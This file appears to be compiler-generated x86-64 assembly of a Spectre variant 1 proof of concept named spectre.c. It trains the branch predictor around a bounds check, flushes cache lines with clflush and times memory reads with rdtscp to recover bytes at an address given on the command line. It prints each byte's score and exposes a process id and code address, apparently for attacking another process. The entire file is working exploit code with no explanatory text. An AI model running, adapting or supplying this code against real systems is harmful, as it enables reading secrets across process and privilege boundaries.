	.file	"spectre.c"
	.text
	.globl	check
	.type	check, @function
check:
.LFB4373:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	cmpq	$15, -8(%rbp)
	ja	.L2
	movl	$1, %eax
	jmp	.L3
.L2:
	movl	$0, %eax
.L3:
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4373:
	.size	check, .-check
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4374:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movq	%rsi, -16(%rbp)
	movq	-16(%rbp), %rax
	movl	(%rax), %eax
	testl	%eax, %eax
	je	.L6
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	movzbl	(%rax,%rdx), %edx
	movzbl	temp(%rip), %eax
	andl	%edx, %eax
	movb	%al, temp(%rip)
.L6:
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4374:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB4375:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%r12
	pushq	%rbx
	subq	$144, %rsp
	.cfi_offset 12, -24
	.cfi_offset 3, -32
	movq	%rdi, -136(%rbp)
	movq	%rsi, -144(%rbp)
	movq	%rdx, -152(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$0, -116(%rbp)
	movl	$0, -104(%rbp)
	jmp	.L8
.L9:
	movl	-104(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	$0, (%rdx,%rax)
	addl	$1, -104(%rbp)
.L8:
	cmpl	$255, -104(%rbp)
	jle	.L9
	movl	$999, -108(%rbp)
	jmp	.L10
.L31:
	movl	$0, -104(%rbp)
	jmp	.L11
.L12:
	movl	-104(%rbp), %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -56(%rbp)
	movq	-56(%rbp), %rax
	clflush	(%rax)
	nop
	addl	$1, -104(%rbp)
.L11:
	cmpl	$255, -104(%rbp)
	jle	.L12
	movl	-108(%rbp), %eax
	cltd
	shrl	$28, %edx
	addl	%edx, %eax
	andl	$15, %eax
	subl	%edx, %eax
	cltq
	movq	%rax, -88(%rbp)
	movl	$29, -100(%rbp)
	jmp	.L13
.L17:
	movl	-100(%rbp), %ecx
	movslq	%ecx, %rax
	imulq	$715827883, %rax, %rax
	shrq	$32, %rax
	movl	%ecx, %esi
	sarl	$31, %esi
	movl	%eax, %edx
	subl	%esi, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%rdx), %eax
	movw	$0, %ax
	cltq
	movq	%rax, -72(%rbp)
	movq	-72(%rbp), %rax
	shrq	$16, %rax
	orq	%rax, -72(%rbp)
	movq	-136(%rbp), %rax
	xorq	-88(%rbp), %rax
	andq	-72(%rbp), %rax
	xorq	-88(%rbp), %rax
	movq	%rax, -72(%rbp)
	cmpq	$15, -72(%rbp)
	ja	.L14
	movl	$1, x_is_safe_static(%rip)
.L14:
	leaq	x_is_safe_static(%rip), %rax
	movq	%rax, -64(%rbp)
	movq	-64(%rbp), %rax
	movq	%rax, -48(%rbp)
	movq	-48(%rbp), %rax
	clflush	(%rax)
	nop
	movl	$0, -112(%rbp)
	jmp	.L15
.L16:
	movl	-112(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -112(%rbp)
.L15:
	movl	-112(%rbp), %eax
	cmpl	$99, %eax
	jle	.L16
	movl	-100(%rbp), %ecx
	movslq	%ecx, %rax
	imulq	$715827883, %rax, %rax
	shrq	$32, %rax
	movl	%ecx, %esi
	sarl	$31, %esi
	movl	%eax, %edx
	subl	%esi, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%rdx), %eax
	movw	$0, %ax
	cltq
	movq	%rax, -72(%rbp)
	movq	-72(%rbp), %rax
	shrq	$16, %rax
	orq	%rax, -72(%rbp)
	movq	-136(%rbp), %rax
	xorq	-88(%rbp), %rax
	andq	-72(%rbp), %rax
	xorq	-88(%rbp), %rax
	movq	%rax, -72(%rbp)
	movq	-64(%rbp), %rdx
	movq	-72(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	victim_function
	movl	$0, x_is_safe_static(%rip)
	subl	$1, -100(%rbp)
.L13:
	cmpl	$0, -100(%rbp)
	jns	.L17
	movl	$0, -104(%rbp)
	jmp	.L18
.L22:
	movl	-104(%rbp), %eax
	imull	$167, %eax, %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -92(%rbp)
	movl	-92(%rbp), %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -80(%rbp)
	leaq	-116(%rbp), %rax
	movq	%rax, -32(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-32(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, %r12
	movq	-80(%rbp), %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	movl	%eax, -116(%rbp)
	leaq	-116(%rbp), %rax
	movq	%rax, -40(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-40(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	subq	%r12, %rax
	movq	%rax, %rbx
	cmpq	$100, %rbx
	ja	.L21
	movl	-108(%rbp), %eax
	cltd
	shrl	$28, %edx
	addl	%edx, %eax
	andl	$15, %eax
	subl	%edx, %eax
	cltq
	leaq	array1(%rip), %rdx
	movzbl	(%rax,%rdx), %eax
	movzbl	%al, %eax
	cmpl	%eax, -92(%rbp)
	je	.L21
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	%ecx, (%rdx,%rax)
.L21:
	addl	$1, -104(%rbp)
.L18:
	cmpl	$255, -104(%rbp)
	jle	.L22
	movl	$-1, -96(%rbp)
	movl	-96(%rbp), %eax
	movl	%eax, -100(%rbp)
	movl	$0, -104(%rbp)
	jmp	.L23
.L28:
	cmpl	$0, -100(%rbp)
	js	.L24
	movl	-104(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-100(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.0(%rip), %rax
	movl	(%rcx,%rax), %eax
	cmpl	%eax, %edx
	jl	.L25
.L24:
	movl	-100(%rbp), %eax
	movl	%eax, -96(%rbp)
	movl	-104(%rbp), %eax
	movl	%eax, -100(%rbp)
	jmp	.L26
.L25:
	cmpl	$0, -96(%rbp)
	js	.L27
	movl	-104(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.0(%rip), %rax
	movl	(%rcx,%rax), %eax
	cmpl	%eax, %edx
	jl	.L26
.L27:
	movl	-104(%rbp), %eax
	movl	%eax, -96(%rbp)
.L26:
	addl	$1, -104(%rbp)
.L23:
	cmpl	$255, -104(%rbp)
	jle	.L28
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	addl	$2, %eax
	leal	(%rax,%rax), %ecx
	movl	-100(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	cmpl	%eax, %ecx
	jl	.L29
	movl	-100(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	cmpl	$2, %eax
	jne	.L30
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	testl	%eax, %eax
	je	.L29
.L30:
	subl	$1, -108(%rbp)
.L10:
	cmpl	$0, -108(%rbp)
	jg	.L31
.L29:
	movl	results.0(%rip), %eax
	movl	%eax, %edx
	movl	-116(%rbp), %eax
	xorl	%edx, %eax
	movl	%eax, results.0(%rip)
	movl	-100(%rbp), %eax
	movl	%eax, %edx
	movq	-144(%rbp), %rax
	movb	%dl, (%rax)
	movl	-100(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movq	-152(%rbp), %rax
	movl	%edx, (%rax)
	movq	-144(%rbp), %rax
	addq	$1, %rax
	movl	-96(%rbp), %edx
	movb	%dl, (%rax)
	movq	-152(%rbp), %rax
	leaq	4(%rax), %rdx
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.0(%rip), %rax
	movl	(%rcx,%rax), %eax
	movl	%eax, (%rdx)
	nop
	movq	-24(%rbp), %rax
	subq	%fs:40, %rax
	je	.L32
	call	__stack_chk_fail@PLT
.L32:
	addq	$144, %rsp
	popq	%rbx
	popq	%r12
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4375:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
	.align 8
.LC1:
	.string	"Putting '%s' in memory, address %p\n"
.LC2:
	.string	"%p"
.LC3:
	.string	"%d"
	.align 8
.LC4:
	.string	"Trying malicious_x = %p, len = %d\n"
.LC5:
	.string	"Reading %d bytes:\n"
	.align 8
.LC6:
	.string	"Reading at malicious_x = %p secc= %c ..."
.LC7:
	.string	"Success"
.LC8:
	.string	"Unclear"
.LC9:
	.string	"%s: "
.LC10:
	.string	"0x%02X='%c' score=%d "
	.align 8
.LC11:
	.string	"(second best: 0x%02X='%c' score=%d)"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4376:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$80, %rsp
	movl	%edi, -68(%rbp)
	movq	%rsi, -80(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
.L51:
	call	getchar@PLT
	movb	%al, -49(%rbp)
	cmpb	$114, -49(%rbp)
	jne	.L34
	movq	secret(%rip), %rdx
	movq	secret(%rip), %rax
	movq	%rax, %rsi
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	secret(%rip), %rax
	leaq	array1(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, -40(%rbp)
	movq	secret(%rip), %rax
	movq	%rax, %rdi
	call	strlen@PLT
	movl	%eax, -48(%rbp)
	movq	$0, -32(%rbp)
	jmp	.L35
.L36:
	leaq	array2(%rip), %rdx
	movq	-32(%rbp), %rax
	addq	%rdx, %rax
	movb	$1, (%rax)
	addq	$1, -32(%rbp)
.L35:
	cmpq	$131071, -32(%rbp)
	jbe	.L36
	cmpl	$3, -68(%rbp)
	jne	.L37
	movq	-80(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-40(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movq	-40(%rbp), %rax
	leaq	array1(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, -40(%rbp)
	movq	-80(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-48(%rbp), %rdx
	leaq	.LC3(%rip), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movl	-48(%rbp), %eax
	movq	-40(%rbp), %rdx
	movq	%rdx, %rcx
	movl	%eax, %edx
	movq	%rcx, %rsi
	leaq	.LC4(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
.L37:
	movl	-48(%rbp), %eax
	movl	%eax, %esi
	leaq	.LC5(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, -44(%rbp)
	jmp	.L38
.L46:
	movq	secret(%rip), %rdx
	movl	-44(%rbp), %eax
	cltq
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movsbl	%al, %eax
	movq	-40(%rbp), %rdx
	movq	%rdx, %rcx
	movl	%eax, %edx
	movq	%rcx, %rsi
	leaq	.LC6(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	addl	$1, -44(%rbp)
	movq	-40(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -40(%rbp)
	leaq	-20(%rbp), %rdx
	leaq	-10(%rbp), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	readMemoryByte
	movl	-20(%rbp), %eax
	movl	-16(%rbp), %edx
	addl	%edx, %edx
	cmpl	%edx, %eax
	jl	.L39
	leaq	.LC7(%rip), %rax
	jmp	.L40
.L39:
	leaq	.LC8(%rip), %rax
.L40:
	movq	%rax, %rsi
	leaq	.LC9(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	-20(%rbp), %edx
	movzbl	-10(%rbp), %eax
	cmpb	$31, %al
	jbe	.L41
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L41
	movzbl	-10(%rbp), %eax
	movzbl	%al, %eax
	jmp	.L42
.L41:
	movl	$63, %eax
.L42:
	movzbl	-10(%rbp), %ecx
	movzbl	%cl, %esi
	movl	%edx, %ecx
	movl	%eax, %edx
	leaq	.LC10(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	-16(%rbp), %eax
	testl	%eax, %eax
	jle	.L43
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L44
	movzbl	-9(%rbp), %eax
	cmpb	$126, %al
	ja	.L44
	movzbl	-9(%rbp), %eax
	movzbl	%al, %eax
	jmp	.L45
.L44:
	movl	$63, %eax
.L45:
	movzbl	-9(%rbp), %ecx
	movzbl	%cl, %esi
	movl	%edx, %ecx
	movl	%eax, %edx
	leaq	.LC11(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
.L43:
	movl	$10, %edi
	call	putchar@PLT
.L38:
	movl	-48(%rbp), %eax
	subl	$1, %eax
	movl	%eax, -48(%rbp)
	movl	-48(%rbp), %eax
	testl	%eax, %eax
	jns	.L46
	jmp	.L51
.L34:
	cmpb	$10, -49(%rbp)
	je	.L54
	cmpb	$105, -49(%rbp)
	jne	.L55
	movl	$0, %eax
	call	getpid@PLT
	movl	%eax, %edx
	leaq	check(%rip), %rax
	addq	$33, %rax
	movq	%rax, %rsi
	leaq	.LC12(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L51
.L54:
	nop
	jmp	.L51
.L55:
	nop
	movl	$0, %eax
	movq	-8(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L53
	call	__stack_chk_fail@PLT
.L53:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4376:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
